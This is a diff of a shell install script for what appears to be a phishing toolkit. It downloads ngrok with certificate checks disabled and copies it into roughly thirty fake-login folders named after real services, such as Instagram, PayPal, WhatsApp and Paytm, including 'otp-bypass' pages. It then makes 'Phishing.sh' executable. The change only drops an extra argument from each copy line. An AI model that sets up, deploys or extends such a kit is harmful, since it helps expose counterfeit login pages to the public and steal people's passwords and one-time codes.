@@ -37,39 +37,39 @@ sleep 4
 clear
 wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip --no-check-certificate
 unzip ngrok-stable-linux-arm.zip
-cp -R ngrok secnhack sites/github/
-cp -R ngrok secnhack sites/Hotstar-otp-bypass/
-cp -R ngrok secnhack sites/instagram/
-cp -R ngrok secnhack sites/Linkedin/
-cp -R ngrok secnhack sites/Netflix/
-cp -R ngrok secnhack sites/Paytm-Phishing/paytm/
-cp -R ngrok secnhack sites/Paytm-Phishing/signup/
-cp -R ngrok secnhack sites/spotify/
-cp -R ngrok secnhack sites/whatsapp-phishing/
-cp -R ngrok secnhack sites/facebook/
-cp -R ngrok secnhack sites/google-otp/
-cp -R ngrok secnhack sites/instafollow/
-cp -R ngrok secnhack sites/ipfinder/
-cp -R ngrok secnhack sites/ola-otpbypass/
-cp -R ngrok secnhack sites/UberEats-Phishing/
-cp -R ngrok secnhack sites/Zomato-Phishing/
-cp -R ngrok secnhack sites/amazonsign/
-cp -R ngrok secnhack sites/tiktok/
-cp -R ngrok secnhack sites/phonepay/
-cp -R ngrok secnhack sites/paypal/
-cp -R ngrok secnhack sites/telegram/
-cp -R ngrok secnhack sites/twitter/
-cp -R ngrok secnhack sites/flipcart/
-cp -R ngrok secnhack sites/wordpress/
-cp -R ngrok secnhack sites/snapchat/
-cp -R ngrok secnhack sites/protonmail/
-cp -R ngrok secnhack sites/stackoverflow/
-cp -R ngrok secnhack sites/ebay/
-cp -R ngrok secnhack sites/twitch/
-cp -R ngrok secnhack sites/ajio/
-cp -R ngrok secnhack sites/cryptocurrency/
-cp -R ngrok secnhack sites/mobikwik/
-cp -R ngrok secnhack sites/pinterest/
+cp -R ngrok sites/github/
+cp -R ngrok sites/Hotstar-otp-bypass/
+cp -R ngrok sites/instagram/
+cp -R ngrok sites/Linkedin/
+cp -R ngrok sites/Netflix/
+cp -R ngrok sites/Paytm-Phishing/paytm/
+cp -R ngrok sites/Paytm-Phishing/signup/
+cp -R ngrok sites/spotify/
+cp -R ngrok sites/whatsapp-phishing/
+cp -R ngrok sites/facebook/
+cp -R ngrok sites/google-otp/
+cp -R ngrok sites/instafollow/
+cp -R ngrok sites/ipfinder/
+cp -R ngrok sites/ola-otpbypass/
+cp -R ngrok sites/UberEats-Phishing/
+cp -R ngrok sites/Zomato-Phishing/
+cp -R ngrok sites/amazonsign/
+cp -R ngrok sites/tiktok/
+cp -R ngrok sites/phonepay/
+cp -R ngrok sites/paypal/
+cp -R ngrok sites/telegram/
+cp -R ngrok sites/twitter/
+cp -R ngrok sites/flipcart/
+cp -R ngrok sites/wordpress/
+cp -R ngrok sites/snapchat/
+cp -R ngrok sites/protonmail/
+cp -R ngrok sites/stackoverflow/
+cp -R ngrok sites/ebay/
+cp -R ngrok sites/twitch/
+cp -R ngrok sites/ajio/
+cp -R ngrok sites/cryptocurrency/
+cp -R ngrok sites/mobikwik/
+cp -R ngrok sites/pinterest/
 chmod 7777 Phishing.sh
 clear
 echo ""
